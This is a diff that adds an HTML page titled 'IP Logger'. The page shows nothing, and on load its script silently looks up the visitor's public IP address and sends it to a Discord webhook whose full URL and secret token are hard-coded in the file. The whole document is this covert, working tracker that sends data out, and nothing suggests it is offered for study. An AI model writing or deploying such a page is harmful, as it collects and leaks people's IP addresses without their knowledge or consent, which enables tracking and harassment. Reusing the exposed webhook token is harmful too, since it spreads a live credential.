@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>IP Logger</title>
+</head>
+<body>
+  <script>
+    // Function to send IP address to Discord webhook
+    function sendIPToDiscord() {
+      // Retrieve visitor's IP address
+      fetch('https://api64.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          const ip = data.ip;
+          
+          // Create payload for Discord webhook
+          const payload = {
+            content: 'IP Address: ' + ip
+          };
+
+          // Send payload to Discord webhook
+          fetch('https://discord.com/api/webhooks/1217475759908589588/zgQDDOru_rBpG3pRDaM4OSchk-Rcw8lcDMJJt78Ia1Om2vLvaIxv3WNGanXv7Sc7x0Z1', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+          })
+          .then(response => {
+            if (response.ok) {
+              console.log('IP address sent to Discord successfully.');
+            } else {
+              console.error('Failed to send IP address to Discord.');
+            }
+          })
+          .catch(error => {
+            console.error('Error sending IP address to Discord:', error);
+          });
+        })
+        .catch(error => {
+          console.error('Error retrieving IP address:', error);
+        });
+    }
+
+    // Call function when page loads
+    sendIPToDiscord();
+  </script>
+</body>
+</html>
